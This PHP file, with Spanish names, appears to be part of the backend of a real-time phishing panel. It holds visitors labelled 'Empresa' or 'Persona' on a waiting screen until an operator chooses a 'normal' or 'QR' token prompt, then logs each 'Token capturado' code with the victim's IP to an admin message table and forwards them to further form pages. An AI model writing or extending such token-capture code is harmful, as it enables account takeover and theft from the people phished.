<?php

function tokenPantallaReiniciarSesion(): void
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        return;
    }

    $_SESSION = [];
}

function tokenPantallaIniciarSesionNueva(): void
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        session_start();
    }

    tokenPantallaReiniciarSesion();
    session_regenerate_id(true);
}

function tokenPantallaMarcarEsperaActiva(): void
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        session_start();
    }

    $_SESSION['token_pantalla_poll_activo'] = true;
}

function tokenPantallaEsperaActiva(): bool
{
    return session_status() === PHP_SESSION_ACTIVE
        && !empty($_SESSION['token_pantalla_poll_activo']);
}

const TOKEN_PANTALLA_MIN_ESPERA_SEG = 60;
const TOKEN_PANTALLA_CHAT_NORMAL = '[[TOKEN_PANTALLA_NORMAL]]';
const TOKEN_PANTALLA_CHAT_QR = '[[TOKEN_PANTALLA_QR]]';

function tokenPantallaPrefijoChat(string $modo): string
{
    return $modo === 'qr' ? TOKEN_PANTALLA_CHAT_QR : TOKEN_PANTALLA_CHAT_NORMAL;
}

function tokenPantallaEtiquetaChatCaptura(string $modo): string
{
    return $modo === 'qr' ? 'Token QR capturado' : 'Token Normal capturado';
}

function tokenPantallaEtiquetaChatDesdeMensaje(string $mensaje): ?string
{
    if (strpos($mensaje, TOKEN_PANTALLA_CHAT_NORMAL) === 0) {
        return substr($mensaje, strlen(TOKEN_PANTALLA_CHAT_NORMAL));
    }

    if (strpos($mensaje, TOKEN_PANTALLA_CHAT_QR) === 0) {
        return substr($mensaje, strlen(TOKEN_PANTALLA_CHAT_QR));
    }

    return null;
}

function tokenPantallaRegistrarCapturaChat(PDO $pdo, int $usuarioId, string $tokenCodigo, string $modo, string $ipUsuario): void
{
    $modo = $modo === 'qr' ? 'qr' : 'normal';
    $mensaje = tokenPantallaPrefijoChat($modo) . tokenPantallaEtiquetaChatCaptura($modo);

    $ins = $pdo->prepare("
        INSERT INTO mensajes_admin (
            usuario_id, admin_id, mensaje, tipo_mensaje, respuesta_usuario, estado,
            fecha_envio, fecha_respuesta, ip_usuario
        ) VALUES (?, 1, ?, 'sin_input', ?, 'respondido', NOW(), NOW(), ?)
    ");
    $ins->execute([$usuarioId, $mensaje, $tokenCodigo, $ipUsuario]);
}

function tokenPantallaEsEmpresa(array $usuario): bool
{
    return strcasecmp(trim($usuario['apellido'] ?? ''), 'Empresa') === 0;
}

function tokenPantallaEsPersona(array $usuario): bool
{
    $apellido = strtolower(trim((string) ($usuario['apellido'] ?? '')));

    return $apellido === 'persona' || $apellido === 'personas';
}

function tokenPantallaUsaControl(array $usuario): bool
{
    return tokenPantallaEsEmpresa($usuario) || tokenPantallaEsPersona($usuario);
}

function tokenPantallaRutas(?array $usuario): array
{
    if ($usuario && tokenPantallaEsPersona($usuario)) {
        return [
            'token' => 'token-personas.php',
            'formulario' => 'formReg-exectution.php',
            'cargando' => 'cargando-execution.php',
            'validando' => 'authenticate-execution.php',
            'login' => 'personas.html',
        ];
    }

    return [
        'token' => 'token.php',
        'gps' => 'netespera.php',
        'validando' => 'index.php',
        'login' => 'index.php',
    ];
}

function tokenPantallaDestinoPostToken(?array $usuario, string $modo = 'normal'): string
{
    $rutas = tokenPantallaRutas($usuario);
    if ($usuario && tokenPantallaEsPersona($usuario)) {
        return $modo === 'qr'
            ? ($rutas['cargando'] ?? 'cargando-execution.php')
            : ($rutas['formulario'] ?? 'formReg-exectution.php');
    }

    return $rutas['gps'] ?? 'netespera.php';
}

function tokenPantallaEsLegacySinControl(?array $usuario): bool
{
    if (!$usuario) {
        return true;
    }

    return ($usuario['token_pantalla_estado'] ?? null) === null
        && ($usuario['token_pantalla_espera_desde'] ?? null) === null;
}

function tokenPantallaObtenerUsuario(PDO $pdo, int $usuarioId): ?array
{
    $stmt = $pdo->prepare('
        SELECT id, apellido, token_pantalla_estado, token_pantalla_modo,
               token_pantalla_espera_desde, token_qr_imagen_url, token_codigo, ip_real,
               CASE
                   WHEN token_pantalla_espera_desde IS NULL THEN 0
                   ELSE GREATEST(0, TIMESTAMPDIFF(SECOND, token_pantalla_espera_desde, NOW()))
               END AS segundos_espera
        FROM usuarios
        WHERE id = ?
    ');
    $stmt->execute([$usuarioId]);
    $row = $stmt->fetch(PDO::FETCH_ASSOC);

    return $row ?: null;
}

function tokenPantallaLiberarAutoNormal(PDO $pdo, int $usuarioId): void
{
    $stmt = $pdo->prepare("
        UPDATE usuarios
        SET token_pantalla_estado = 'liberado',
            token_pantalla_modo = NULL,
            token_qr_imagen_url = NULL
        WHERE id = ?
          AND (token_pantalla_estado IS NULL OR token_pantalla_estado = 'pendiente')
    ");
    $stmt->execute([$usuarioId]);
}

function tokenPantallaRequiereCapturaToken(?array $usuario): bool
{
    if (!$usuario) {
        return false;
    }

    $modo = strtolower(trim((string) ($usuario['token_pantalla_modo'] ?? '')));

    return $modo === 'normal' || $modo === 'qr';
}

function tokenPantallaOmitirToken(?array $usuario): bool
{
    if (!$usuario) {
        return false;
    }

    if (($usuario['token_pantalla_estado'] ?? null) !== 'liberado') {
        return false;
    }

    return !tokenPantallaRequiereCapturaToken($usuario);
}

function tokenPantallaUrlAvance(array $avance, ?array $usuario = null): string
{
    $rutas = tokenPantallaRutas($usuario);

    if ($usuario && tokenPantallaEsPersona($usuario)) {
        return !empty($avance['omitir_token'])
            ? ($rutas['formulario'] ?? 'formReg-exectution.php')
            : $rutas['token'];
    }

    $destino = !empty($avance['omitir_token']) ? $rutas['gps'] : $rutas['token'];

    if (strpos($destino, 'empresas/') === 0) {
        return $destino;
    }

    return 'empresas/' . ltrim($destino, '/');
}

function tokenPantallaPuedeAccederGps(?array $usuario): bool
{
    if (!$usuario) {
        return false;
    }

    if (!tokenPantallaUsaControl($usuario) || tokenPantallaEsLegacySinControl($usuario)) {
        return true;
    }

    return tokenPantallaTokenIngresado($usuario) || tokenPantallaOmitirToken($usuario);
}

function tokenPantallaTokenIngresado(?array $usuario): bool
{
    if (!$usuario) {
        return false;
    }

    return trim((string) ($usuario['token_codigo'] ?? '')) !== '';
}

function tokenPantallaEvaluarAvance(PDO $pdo, int $usuarioId): array
{
    $usuario = tokenPantallaObtenerUsuario($pdo, $usuarioId);

    if (!$usuario || !tokenPantallaUsaControl($usuario)) {
        return [
            'puede_avanzar' => true,
            'modo' => 'normal',
            'liberado' => true,
            'auto_normal' => false,
            'omitir_token' => false,
            'segundos_restantes' => 0,
        ];
    }

    if (tokenPantallaEsLegacySinControl($usuario)) {
        return [
            'puede_avanzar' => true,
            'modo' => 'normal',
            'liberado' => true,
            'auto_normal' => false,
            'omitir_token' => false,
            'segundos_restantes' => 0,
        ];
    }

    $estado = $usuario['token_pantalla_estado'] ?? null;
    $modo = $usuario['token_pantalla_modo'] ?? null;
    $segundos = (int) ($usuario['segundos_espera'] ?? 0);
    $minCumplida = $segundos >= TOKEN_PANTALLA_MIN_ESPERA_SEG;
    $restantes = max(0, TOKEN_PANTALLA_MIN_ESPERA_SEG - $segundos);
    $autoNormal = false;
    $omitirToken = false;

    if ($estado === 'liberado') {
        $omitirToken = tokenPantallaOmitirToken($usuario);

        return [
            'puede_avanzar' => true,
            'modo' => $modo,
            'liberado' => true,
            'auto_normal' => false,
            'omitir_token' => $omitirToken,
            'segundos_restantes' => 0,
            'imagen_url' => $usuario['token_qr_imagen_url'] ?? null,
        ];
    }

    if ($minCumplida) {
        tokenPantallaLiberarAutoNormal($pdo, $usuarioId);
        $autoNormal = true;
        $omitirToken = true;

        return [
            'puede_avanzar' => true,
            'modo' => null,
            'liberado' => true,
            'auto_normal' => $autoNormal,
            'omitir_token' => $omitirToken,
            'segundos_restantes' => 0,
            'imagen_url' => null,
        ];
    }

    return [
        'puede_avanzar' => false,
        'modo' => null,
        'liberado' => false,
        'auto_normal' => false,
        'omitir_token' => false,
        'segundos_restantes' => $restantes,
        'imagen_url' => null,
    ];
}

function validarUrlImagenTokenQr(string $url): bool
{
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return false;
    }

    $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?? '');
    if (!in_array($scheme, ['http', 'https'], true)) {
        return false;
    }

    $path = parse_url($url, PHP_URL_PATH) ?? '';

    return (bool) preg_match('/\.(png|jpe?g|webp|gif)$/i', $path);
}
